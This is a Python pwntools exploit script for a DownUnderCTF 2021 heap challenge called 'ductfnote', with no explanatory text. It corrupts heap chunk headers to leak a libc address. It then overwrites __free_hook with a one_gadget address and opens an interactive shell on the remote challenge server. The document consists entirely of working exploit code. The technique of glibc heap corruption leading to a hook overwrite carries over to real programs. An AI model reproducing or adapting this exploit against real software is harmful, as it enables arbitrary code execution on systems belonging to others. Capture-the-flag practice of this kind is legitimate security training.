from pwn import *
#p=process('./ductfnote')
p=remote('pwn-2021.duc.tf',31917)
elf = ELF('./ductfnote')
libc = ELF('libc-2.31.so')
#raw_input("DEBUG")


'''
b*0x00005555555555f5
b*0x000055555555571c
b*0x0000555555555380
'''
def create(size):
	p.sendlineafter(">> ","1")
	p.sendlineafter("Size: ",str(size))


def show():
	p.sendlineafter(">> ","2")

def edit(data):
	p.sendlineafter(">> ","3")
	p.sendline(str(data))

def delete():
	p.sendlineafter(">> ","4")


create(0x7f)
payload = "\x00"*212
payload += p64(0x21)
payload += p64(0xffffffffffffffff)
payload += p64(0)*2
payload += p64(0x190)

edit(payload)
delete()

create(0x7f)
delete()

create(0x3e0)
create(0x200) #prevent consolidate topchunk

create(0x7f)
payload = "\x00"*212
payload += p64(0x21)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)*2
payload += p64(0x501)
edit(payload)
delete()

create(0x100)
payload = "\x00"*212
payload += p64(0x21)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)*2
payload += p64(0x211) 
payload += p32(0x210)	
edit(payload)

show()

p.recv(0x130)
leak = u64(p.recv(6)+"\x00"*2)
log.info("leak: " + hex(leak))
libc_base = leak - 0x1ebbe0
log.info("leak: " + hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
#0xe6c7e 0xe6c81 0xe6c84
one_gadget = libc_base + 0xe6c81
log.info("One_gadget: "+hex(one_gadget))
delete()

create(0x300)
delete()

create(0x17f) 
payload = "a"*0x80 
payload += "\x00"*0x4
payload += p64(free_hook-0x8)


edit(payload)
create(0x300) 
payload = 'a'*4 
payload += p64(one_gadget)
edit(payload)
delete()

p.interactive()
